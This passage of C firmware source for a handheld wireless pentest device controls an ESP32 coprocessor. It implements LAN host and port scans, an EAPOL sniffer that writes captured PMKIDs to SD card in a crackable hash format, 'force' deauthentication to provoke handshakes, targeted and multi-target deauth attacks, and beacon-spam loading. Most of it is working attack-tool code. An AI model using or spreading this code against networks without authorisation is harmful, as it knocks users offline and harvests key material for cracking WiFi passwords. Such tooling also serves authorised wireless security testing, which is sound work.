	m1_cmd_t cmd;
	m1_resp_t resp;
	wifi_netscan_result_t results[NETSCAN_RESULTS_MAX];
	uint8_t result_count = 0;
	uint8_t view_idx = 0;
	uint8_t progress = 0;
	bool done = false;
	uint8_t base_ip[4] = {0};
	char ln[26];
	int spi_ret;

	ensure_esp32_ready();

	memset(results, 0, sizeof(results));
	memset(&cmd, 0, sizeof(cmd));
	cmd.magic = M1_CMD_MAGIC;
	cmd.cmd_id = CMD_NETSCAN_START;
	cmd.payload[0] = mode;
	cmd.payload[1] = (mode == NETSCAN_MODE_PING || mode == NETSCAN_MODE_ARP) ? 150 : 80;
	cmd.payload_len = 2;

	spi_ret = m1_esp32_send_cmd(&cmd, &resp, SNIFF_CMD_TIMEOUT);
	if (spi_ret != 0 || resp.status != RESP_OK)
	{
		wifi_show_message(title, "Join WiFi first", NULL);
		return;
	}

	if (resp.payload_len >= 4)
	{
		memcpy(base_ip, resp.payload, 4);
	}

	while (1)
	{
		spi_ret = m1_esp32_simple_cmd(CMD_NETSCAN_NEXT, &resp, 1000);
		if (spi_ret == 0 && resp.status == RESP_OK && resp.payload_len >= 1)
		{
			if (resp.payload[0] == 1 && resp.payload_len >= 9)
			{
				if (result_count < NETSCAN_RESULTS_MAX)
				{
					memcpy(results[result_count].ip, &resp.payload[1], 4);
					results[result_count].port = resp.payload[5] | ((uint16_t)resp.payload[6] << 8);
					if (resp.payload_len >= 16 && resp.payload[9])
					{
						results[result_count].has_mac = true;
						memcpy(results[result_count].mac, &resp.payload[10], 6);
					}
					result_count++;
				}
				progress = resp.payload[8];
			}
			else if (resp.payload[0] == 2 && resp.payload_len >= 3)
			{
				done = true;
				progress = resp.payload[2];
			}
			else if (resp.payload[0] == 0 && resp.payload_len >= 3)
			{
				progress = resp.payload[2];
			}
		}

		if (view_idx >= result_count && result_count > 0)
		{
			view_idx = result_count - 1;
		}

		m1_u8g2_firstpage();
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
		u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, title);

		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
		snprintf(ln, sizeof(ln), "%s F:%d H:%d", done ? "Done" : "Scan", result_count, progress);
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, ln);

		if (result_count == 0)
		{
			if (base_ip[0])
			{
				snprintf(ln, sizeof(ln), "%d.%d.%d.0/24",
					base_ip[0], base_ip[1], base_ip[2]);
				u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);
			}
			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP,
				done ? ((mode == NETSCAN_MODE_SSH || mode == NETSCAN_MODE_TELNET ||
					mode == NETSCAN_MODE_COMMON) ? "No open ports" : "No hosts found") : "Waiting...");
		}
		else
		{
			if (mode == NETSCAN_MODE_ARP && results[view_idx].has_mac)
			{
				wifi_netscan_result_t *r = &results[view_idx];
				snprintf(ln, sizeof(ln), "%d.%d.%d.%d",
					r->ip[0], r->ip[1], r->ip[2], r->ip[3]);
				u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);
				snprintf(ln, sizeof(ln), "%02X:%02X:%02X:%02X:%02X:%02X",
					r->mac[0], r->mac[1], r->mac[2], r->mac[3], r->mac[4], r->mac[5]);
				u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, ln);
			}
			else
			{
				for (uint8_t i = 0; i < 3 && view_idx + i < result_count; i++)
				{
					wifi_netscan_result_t *r = &results[view_idx + i];
					if (mode == NETSCAN_MODE_PING || mode == NETSCAN_MODE_ARP)
					{
						snprintf(ln, sizeof(ln), "%d.%d.%d.%d",
							r->ip[0], r->ip[1], r->ip[2], r->ip[3]);
					}
					else
					{
						snprintf(ln, sizeof(ln), "%d.%d.%d.%d:%d",
							r->ip[0], r->ip[1], r->ip[2], r->ip[3], r->port);
					}
					u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + (i + 1) * SF_Y_STEP, ln);
				}
			}
		}

		u8g2_DrawStr(&m1_u8g2, 2, 63, done ? "[BACK] Exit [^v]View" : "[BACK] Stop [^v]View");
		m1_u8g2_nextpage();

		ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(400));
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				m1_esp32_simple_cmd(CMD_NETSCAN_STOP, &resp, 1000);
				xQueueReset(main_q_hdl);
				break;
			}
			else if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
			{
				if (view_idx > 0) view_idx--;
			}
			else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
			{
				if (view_idx + 1 < result_count) view_idx++;
			}
		}
	}
}

void wifi_scan_ping(void)   { wifi_netscan_run(NETSCAN_MODE_PING, "PING SCAN"); }
void wifi_scan_arp(void)    { wifi_netscan_run(NETSCAN_MODE_ARP, "ARP SCAN"); }
void wifi_scan_ssh(void)    { wifi_netscan_run(NETSCAN_MODE_SSH, "SSH SCAN"); }
void wifi_scan_telnet(void) { wifi_netscan_run(NETSCAN_MODE_TELNET, "TELNET SCAN"); }
void wifi_scan_ports(void)  { wifi_netscan_run(NETSCAN_MODE_COMMON, "PORT SCAN"); }


/*============================================================================*/
/*  EAPOL sniffer with PMKID save to SD                                      */
/*============================================================================*/

static void pmkid_save_to_sd(const uint8_t *src, const uint8_t *bssid,
	const uint8_t *pmkid_bytes)
{
	/* Try to find SSID from cached AP scan results */
	char ssid_hex[65] = {0};
	bool found_ssid = false;

	if (ap_list && ap_count)
	{
		for (uint16_t i = 0; i < ap_count; i++)
		{
			if (memcmp(ap_list[i].bssid, bssid, 6) == 0 && ap_list[i].ssid[0])
			{
				uint8_t sl = (uint8_t)strnlen(ap_list[i].ssid, 32);
				for (uint8_t j = 0; j < sl; j++)
					sprintf(&ssid_hex[j * 2], "%02x", (uint8_t)ap_list[i].ssid[j]);
				found_ssid = true;
				break;
			}
		}
	}

	if (!found_ssid)
		strcpy(ssid_hex, "");

	/* Format: WPA*01*PMKID*MAC_AP*MAC_STA*ESSID_HEX */
	char line[200];
	snprintf(line, sizeof(line),
		"WPA*01*"
		"%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x*"
		"%02x%02x%02x%02x%02x%02x*"
		"%02x%02x%02x%02x%02x%02x*"
		"%s\n",
		pmkid_bytes[0], pmkid_bytes[1], pmkid_bytes[2], pmkid_bytes[3],
		pmkid_bytes[4], pmkid_bytes[5], pmkid_bytes[6], pmkid_bytes[7],
		pmkid_bytes[8], pmkid_bytes[9], pmkid_bytes[10], pmkid_bytes[11],
		pmkid_bytes[12], pmkid_bytes[13], pmkid_bytes[14], pmkid_bytes[15],
		bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
		src[0], src[1], src[2], src[3], src[4], src[5],
		ssid_hex);

	/* Create /pmkid directory if needed, append to captures file */
	f_mkdir("pmkid");
	FIL fil;
	if (f_open(&fil, "pmkid/captures.22000", FA_WRITE | FA_OPEN_APPEND) == FR_OK)
	{
		UINT bw;
		f_write(&fil, line, strlen(line), &bw);
		f_close(&fil);
	}
}


void wifi_sniff_eapol(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	m1_cmd_t cmd;
	m1_resp_t resp, last_resp;
	int spi_ret;
	uint16_t pkt_count = 0;
	uint16_t pmkid_count = 0;
	bool paused = false;
	bool has_pkt = false;
	bool pcap_active;
	bool force_deauth_started = false;
	uint8_t force_targets = 0;
	char ln[26];

	ensure_esp32_ready();
	wifi_capture_cfg_load();
	pcap_active = wifi_pcap_open(SNIFF_EAPOL);
	if (wifi_capture_cfg.force_pmkid)
	{
		force_deauth_started = wifi_force_deauth_start(&resp, &force_targets);
	}

	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
	m1_u8g2_firstpage();
	u8g2_DrawStr(&m1_u8g2, 6, 15, "EAPOL Sniffer");
	u8g2_DrawStr(&m1_u8g2, 6, 30, "Starting...");
	u8g2_DrawXBMP(&m1_u8g2, M1_LCD_DISPLAY_WIDTH / 2 - 18 / 2,
		M1_LCD_DISPLAY_HEIGHT / 2 - 2, 18, 32, hourglass_18x32);
	m1_u8g2_nextpage();

	memset(&cmd, 0, sizeof(cmd));
	cmd.magic = M1_CMD_MAGIC;
	cmd.cmd_id = CMD_PKTMON_START;
	cmd.payload_len = 4;
	cmd.payload[0] = SNIFF_EAPOL;
	cmd.payload[1] = 0;
	cmd.payload[2] = 5;
	cmd.payload[3] = pcap_active ? 0x01 : 0x00;

	spi_ret = m1_esp32_send_cmd(&cmd, &resp, SNIFF_CMD_TIMEOUT);
	if (spi_ret != 0 || resp.status != RESP_OK)
	{
		wifi_force_deauth_stop(force_deauth_started);
		wifi_pcap_close();
		m1_u8g2_firstpage();
		u8g2_DrawStr(&m1_u8g2, 6, 15, "EAPOL");
		u8g2_DrawStr(&m1_u8g2, 6, 30, "Start failed!");
		m1_u8g2_nextpage();
		HAL_Delay(2000);
		return;
	}

	m1_u8g2_firstpage();
	u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
	u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, "EAPOL");
	u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
	u8g2_DrawStr(&m1_u8g2, 2, 35, "Listening for handshakes..");
	m1_u8g2_nextpage();

	while (1)
	{
		ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(SNIFF_POLL_MS));
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				m1_esp32_simple_cmd(CMD_PKTMON_STOP, &resp, 1000);
				wifi_force_deauth_stop(force_deauth_started);
				wifi_pcap_close();
				xQueueReset(main_q_hdl);
				break;
			}
			if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				paused = !paused;
				if (has_pkt)
					sniffer_draw_packet(&last_resp, "EAPOL", pkt_count, paused);
			}
		}

		if (paused) continue;

		(void)wifi_pcap_poll(3);

		spi_ret = m1_esp32_simple_cmd(CMD_PKTMON_NEXT, &resp, WIFI_NEXT_TIMEOUT_MS);
		if (spi_ret != 0 || resp.status != RESP_OK || resp.payload_len == 0)
			continue;

		pkt_count++;
		memcpy(&last_resp, &resp, sizeof(m1_resp_t));
		has_pkt = true;

		/* Check for PMKID and auto-save */
		uint8_t dlen = resp.payload[3];
		const uint8_t *d = &resp.payload[4];
		if (dlen >= 37 && d[20] == 1) /* has_pmkid flag */
		{
			pmkid_count++;
			pmkid_save_to_sd(d, &d[12], &d[21]);
		}

		/* Draw with PMKID counter in title */
		m1_u8g2_firstpage();
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
		u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
			paused ? "[PAUSED]" : "EAPOL");
		sprintf(ln, "#%d", pkt_count);
		u8g2_DrawStr(&m1_u8g2, 128 - strlen(ln) * M1_GUI_FONT_WIDTH,
			M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, ln);

		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
		uint8_t y = SF_Y_START;

		if (dlen >= 21) {
			sprintf(ln, "S>%02X:%02X:%02X:%02X:%02X:%02X",
				d[0], d[1], d[2], d[3], d[4], d[5]);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

			sprintf(ln, "AP:%02X:%02X:%02X:%02X:%02X:%02X",
				d[12], d[13], d[14], d[15], d[16], d[17]);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

			uint16_t ki = d[18] | (d[19] << 8);
			sprintf(ln, "Key:%04X CH:%d", ki, resp.payload[2]);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

			if (d[20])
				sprintf(ln, "PMKID:YES! Saved:%d", pmkid_count);
			else
				sprintf(ln, "PMKID:no  Total:%d", pmkid_count);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln);
			if (force_deauth_started)
			{
				snprintf(ln, sizeof(ln), "Force:%d targets", force_targets);
				u8g2_DrawStr(&m1_u8g2, 2, 63, ln);
			}
		}

		m1_u8g2_nextpage();
	}
}


/*============================================================================*/
/*  Deauth Attack UI                                                         */
/*============================================================================*/

static void wifi_deauth_run(uint8_t *bssid, uint8_t channel, const char *ssid)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	m1_cmd_t cmd;
	m1_resp_t resp;
	int spi_ret;
	char ln[26];
	uint32_t start_tick;

	/* Build deauth command: bssid(6) + channel(1) */
	memset(&cmd, 0, sizeof(cmd));
	cmd.magic = M1_CMD_MAGIC;
	cmd.cmd_id = CMD_DEAUTH_START;
	cmd.payload_len = 7;
	memcpy(cmd.payload, bssid, 6);
	cmd.payload[6] = channel;

	spi_ret = m1_esp32_send_cmd(&cmd, &resp, SNIFF_CMD_TIMEOUT);
	if (spi_ret != 0 || resp.status != RESP_OK)
	{
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		m1_u8g2_firstpage();
		u8g2_DrawStr(&m1_u8g2, 6, 15, "Deauth");
		u8g2_DrawStr(&m1_u8g2, 6, 30, "Start failed!");
		m1_u8g2_nextpage();
		HAL_Delay(2000);
		return;
	}

	start_tick = HAL_GetTick();

	/* Deauth running loop */
	while (1)
	{
		uint32_t elapsed = (HAL_GetTick() - start_tick) / 1000;

		m1_u8g2_firstpage();
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
		u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
			"DEAUTH ACTIVE");

		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
		uint8_t y = SF_Y_START;

		/* Target SSID */
		if (ssid && ssid[0])
		{
			strncpy(ln, ssid, 24);
			ln[24] = '\0';
		}
		else
			strcpy(ln, "*hidden*");
		u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

		/* Target BSSID */
		sprintf(ln, "%02X:%02X:%02X:%02X:%02X:%02X",
			bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
		u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

		sprintf(ln, "Channel: %d", channel);
		u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

		sprintf(ln, "Time: %lus", elapsed);
		u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

		u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK] Stop");
		m1_u8g2_nextpage();

		ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(500));
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				m1_esp32_simple_cmd(CMD_DEAUTH_STOP, &resp, 1000);
				xQueueReset(main_q_hdl);
				break;
			}
		}
	}
}

static bool wifi_mac_is_nonzero(const uint8_t mac[6])
{
	return mac[0] || mac[1] || mac[2] || mac[3] || mac[4] || mac[5];
}

static uint8_t wifi_deauth_add_target(m1_cmd_t *cmd, uint8_t count, uint8_t mode,
	uint8_t channel, const uint8_t bssid[6], const uint8_t sta[6])
{
	uint8_t off;

	if (count >= DEAUTH_MULTI_MAX_TARGETS || !bssid || !wifi_mac_is_nonzero(bssid) || channel == 0)
	{
		return count;
	}

	off = 1 + count * DEAUTH_MULTI_TARGET_BYTES;
	cmd->payload[off] = mode;
	cmd->payload[off + 1] = channel;
	memcpy(&cmd->payload[off + 2], bssid, 6);
	if (sta)
	{
		memcpy(&cmd->payload[off + 8], sta, 6);
	}

	count++;
	cmd->payload[0] = count;
	cmd->payload_len = 1 + count * DEAUTH_MULTI_TARGET_BYTES;
	return count;
}

static uint8_t wifi_build_selected_deauth_cmd(m1_cmd_t *cmd, uint8_t *ap_targets,
	uint8_t *sta_targets, uint16_t *selected_total)
{
	uint8_t count = 0;
	uint8_t ap_count_used = 0;
	uint8_t sta_count_used = 0;

	memset(cmd, 0, sizeof(*cmd));
	cmd->magic = M1_CMD_MAGIC;
	cmd->cmd_id = CMD_DEAUTH_MULTI;
	cmd->payload_len = 1;

	if (ap_list)
	{
		for (uint16_t i = 0; i < ap_count && count < DEAUTH_MULTI_MAX_TARGETS; i++)
		{
			if (!ap_list[i].selected) continue;
			uint8_t before = count;
			count = wifi_deauth_add_target(cmd, count, 0, ap_list[i].channel,
				ap_list[i].bssid, NULL);
			if (count != before) ap_count_used++;
		}
	}

	if (sta_list_data)
	{
		for (uint16_t i = 0; i < sta_total && count < DEAUTH_MULTI_MAX_TARGETS; i++)
		{
			if (!sta_list_data[i].selected) continue;
			uint8_t before = count;
			count = wifi_deauth_add_target(cmd, count, 1, sta_list_data[i].channel,
				sta_list_data[i].bssid, sta_list_data[i].mac);
			if (count != before) sta_count_used++;
		}
	}

	if (ap_targets) *ap_targets = ap_count_used;
	if (sta_targets) *sta_targets = sta_count_used;
	if (selected_total) *selected_total = wifi_selected_ap_count() + wifi_selected_sta_count();
	return count;
}

static bool wifi_force_deauth_start(m1_resp_t *resp, uint8_t *target_count)
{
	m1_cmd_t cmd;
	uint8_t ap_targets = 0;
	uint8_t sta_targets = 0;
	uint16_t selected_total = 0;
	uint8_t count;

	count = wifi_build_selected_deauth_cmd(&cmd, &ap_targets, &sta_targets, &selected_total);
	if (target_count) *target_count = count;
	if (count == 0) return false;

	if (m1_esp32_send_cmd(&cmd, resp, SNIFF_CMD_TIMEOUT) != 0 ||
		resp->status != RESP_OK)
	{
		if (target_count) *target_count = 0;
		return false;
	}

	(void)ap_targets;
	(void)sta_targets;
	(void)selected_total;
	return true;
}

static void wifi_force_deauth_stop(bool started)
{
	m1_resp_t resp;
	if (started)
	{
		m1_esp32_simple_cmd(CMD_DEAUTH_STOP, &resp, 1000);
	}
}

static void wifi_deauth_selected_run(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	m1_cmd_t cmd;
	m1_resp_t resp;
	uint8_t target_count;
	uint8_t ap_targets;
	uint8_t sta_targets;
	uint16_t selected_total;
	int spi_ret;
	char ln[26];
	uint32_t start_tick;

	target_count = wifi_build_selected_deauth_cmd(&cmd, &ap_targets, &sta_targets, &selected_total);
	if (target_count == 0)
	{
		wifi_show_message("Deauth", "No usable targets", "Need BSSID/channel");
		return;
	}

	spi_ret = m1_esp32_send_cmd(&cmd, &resp, SNIFF_CMD_TIMEOUT);
	if (spi_ret != 0 || resp.status != RESP_OK)
	{
		wifi_show_message("Deauth", "Start failed", "Flash ESP32 FW?");
		return;
	}

	start_tick = HAL_GetTick();

	while (1)
	{
		uint32_t elapsed = (HAL_GetTick() - start_tick) / 1000;

		m1_u8g2_firstpage();
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
		u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
			"DEAUTH SELECTED");

		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
		snprintf(ln, sizeof(ln), "Targets:%d/%d", target_count, selected_total);
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, ln);
		snprintf(ln, sizeof(ln), "AP:%d  STA:%d", ap_targets, sta_targets);
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);
		if (selected_total > target_count)
		{
			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, "Limit: 4 per run");
		}
		else
		{
			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, "Rotating targets");
		}
		snprintf(ln, sizeof(ln), "Time: %lus", elapsed);
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 3 * SF_Y_STEP, ln);
		u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK] Stop");
		m1_u8g2_nextpage();

		ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(500));
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				m1_esp32_simple_cmd(CMD_DEAUTH_STOP, &resp, 1000);
				xQueueReset(main_q_hdl);
				break;
			}
		}
	}
}

/* Standalone deauth: scan first if no cached results, then select target */
void wifi_attack_deauth(void)
{
	S_M1_Buttons_Status this_button_status;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	uint16_t list_count;

	ensure_esp32_ready();

	if (wifi_selected_ap_count() > 0 || wifi_selected_sta_count() > 0)
	{
		wifi_deauth_selected_run();
		return;
	}

	/* If no cached AP results, do a fresh scan */
	if (!ap_list || ap_count == 0)
	{
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		m1_u8g2_firstpage();
		u8g2_DrawStr(&m1_u8g2, 6, 15, "Deauth Attack");
		u8g2_DrawStr(&m1_u8g2, 6, 30, "Scanning targets...");
		u8g2_DrawXBMP(&m1_u8g2, M1_LCD_DISPLAY_WIDTH / 2 - 18 / 2,
			M1_LCD_DISPLAY_HEIGHT / 2 - 2, 18, 32, hourglass_18x32);
		m1_u8g2_nextpage();

		list_count = wifi_do_scan();
	}
	else
		list_count = ap_count;

	if (!list_count)
	{
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		m1_u8g2_firstpage();
		u8g2_DrawStr(&m1_u8g2, 6, 15, "Deauth Attack");
		u8g2_DrawXBMP(&m1_u8g2, M1_LCD_DISPLAY_WIDTH / 2 - 32 / 2,
			M1_LCD_DISPLAY_HEIGHT / 2 - 2, 32, 32, wifi_error_32x32);
		u8g2_DrawStr(&m1_u8g2, 6, 30, "No targets found");
		m1_u8g2_nextpage();
		HAL_Delay(2000);
		return;
	}

	/* Show AP list for target selection */
	wifi_ap_list_print(true);

	while (1)
	{
		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &this_button_status, 0);
			if (this_button_status.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				xQueueReset(main_q_hdl);
				break;
			}
			else if (this_button_status.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
				wifi_ap_list_print(true);
			else if (this_button_status.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
				wifi_ap_list_print(false);
			else if (this_button_status.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				if (ap_list && ap_view_idx < ap_count)
				{
					wifi_deauth_run(ap_list[ap_view_idx].bssid,
						ap_list[ap_view_idx].channel,
						ap_list[ap_view_idx].ssid);
					wifi_ap_list_print(true);
					wifi_ap_list_print(false);
				}
			}
		}
	}
}


/*============================================================================*/
/*  Beacon Spam — shared batch-load + run helpers                            */
/*============================================================================*/

static void beacon_load_diag_set(beacon_load_diag_t *diag, const char *stage,
	int spi_ret, uint8_t status, uint8_t batch)
{
	if (diag == NULL)
	{
		return;
	}

	diag->stage = stage;
	diag->spi_ret = spi_ret;
	diag->status = status;
	diag->batch = batch;
}

static uint8_t beacon_resp_status(int spi_ret, const m1_resp_t *resp)
{
	return (spi_ret == 0) ? resp->status : 0xFF;
}

static void beacon_load_failed_screen(const char *title, const beacon_load_diag_t *diag)
{
	char ln[26];

	m1_u8g2_firstpage();
	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
	u8g2_DrawStr(&m1_u8g2, 6, 12, title);
	u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
	u8g2_DrawStr(&m1_u8g2, 6, 25, "Load failed!");
	snprintf(ln, sizeof(ln), "Stage:%s", (diag && diag->stage) ? diag->stage : "?");
	u8g2_DrawStr(&m1_u8g2, 6, 36, ln);
	snprintf(ln, sizeof(ln), "SPI:%d ST:%u", diag ? diag->spi_ret : -9,
		diag ? diag->status : 0);
	u8g2_DrawStr(&m1_u8g2, 6, 47, ln);
	if (diag && diag->spi_ret == 0 && diag->status == RESP_ERR)
	{
		u8g2_DrawStr(&m1_u8g2, 6, 58, "Flash ESP32 FW");
	}
	else
	{
		u8g2_DrawStr(&m1_u8g2, 6, 58, "Check ESP32/SPI");
	}
	m1_u8g2_nextpage();
}

static uint8_t beacon_batch_load(const char **ssids, uint8_t count, beacon_load_diag_t *diag)
{
	m1_cmd_t cmd;
	m1_resp_t resp;
	int spi_ret;
	uint8_t batch = 0;

	beacon_load_diag_set(diag, "OK", 0, RESP_OK, 0);

	spi_ret = m1_esp32_simple_cmd(CMD_SSID_CLEAR, &resp, 1000);
	if (spi_ret != 0 || resp.status != RESP_OK)
	{
		beacon_load_diag_set(diag, "CLEAR", spi_ret, beacon_resp_status(spi_ret, &resp), 0);
		return 0;
	}

	uint8_t pos = 0;
	memset(&cmd, 0, sizeof(cmd));
	cmd.magic = M1_CMD_MAGIC;
	cmd.cmd_id = CMD_SSID_ADD;

	for (uint8_t i = 0; i < count; i++)
	{
		uint8_t sl = (uint8_t)strnlen(ssids[i], 32);
		if (pos + sl + 1 > 61)
		{
			cmd.payload_len = pos;
			spi_ret = m1_esp32_send_cmd(&cmd, &resp, 1000);
			if (spi_ret != 0 || resp.status != RESP_OK)
			{
				beacon_load_diag_set(diag, "ADD", spi_ret, beacon_resp_status(spi_ret, &resp), batch);
				return 0;
			}
			batch++;
			pos = 0;
			memset(cmd.payload, 0, 61);
		}
		memcpy(&cmd.payload[pos], ssids[i], sl);
		pos += sl;
		cmd.payload[pos++] = '\0';
	}
	if (pos > 0)
	{
		cmd.payload_len = pos;
		spi_ret = m1_esp32_send_cmd(&cmd, &resp, 1000);
		if (spi_ret != 0 || resp.status != RESP_OK)
		{
			beacon_load_diag_set(diag, "ADD", spi_ret, beacon_resp_status(spi_ret, &resp), batch);
			return 0;
		}
	}

	spi_ret = m1_esp32_simple_cmd(CMD_SSID_COUNT, &resp, 500);
	if (spi_ret != 0 || resp.status != RESP_OK || resp.payload_len < 1)
	{
		beacon_load_diag_set(diag, "COUNT", spi_ret, beacon_resp_status(spi_ret, &resp), batch);
		return 0;
	}

	return resp.payload[0];
}

static void beacon_set_flags(uint8_t flags)
{
	m1_cmd_t cmd;
	m1_resp_t resp;

	memset(&cmd, 0, sizeof(cmd));
	cmd.magic = M1_CMD_MAGIC;
	cmd.cmd_id = CMD_BEACON_SET_FLAGS;
	cmd.payload[0] = flags;
	cmd.payload_len = 1;
	m1_esp32_send_cmd(&cmd, &resp, 1000);
}

static void beacon_run_loop(const char *title, const char **ssids, uint8_t ssid_count,
	uint8_t total_loaded, bool auto_scroll)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	m1_resp_t resp;
	char ln[26];
	uint32_t start_tick = HAL_GetTick();
	uint32_t last_scroll_tick = start_tick;
	uint8_t display_offset = 0;

	while (1)
	{
		uint32_t now = HAL_GetTick();
		uint32_t elapsed = (now - start_tick) / 1000;

		if (auto_scroll && ssid_count > 3 && (now - last_scroll_tick) >= 1500)
		{
			display_offset++;
			if (display_offset >= ssid_count)
			{
				display_offset = 0;
			}
			last_scroll_tick = now;
		}

		m1_u8g2_firstpage();
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
		u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, title);

		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
		uint8_t y = SF_Y_START;

		snprintf(ln, sizeof(ln), "SSIDs:%d  Time:%lus", total_loaded, elapsed);
		u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

		for (int i = 0; i < 3 && (display_offset + i) < ssid_count; i++)
		{
			strncpy(ln, ssids[display_offset + i], 24);
			ln[24] = '\0';
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;
		}

		u8g2_DrawStr(&m1_u8g2, 2, 63, auto_scroll ? "[BACK]Stop Auto" : "[BACK]Stop [^v]Scroll");
		m1_u8g2_nextpage();

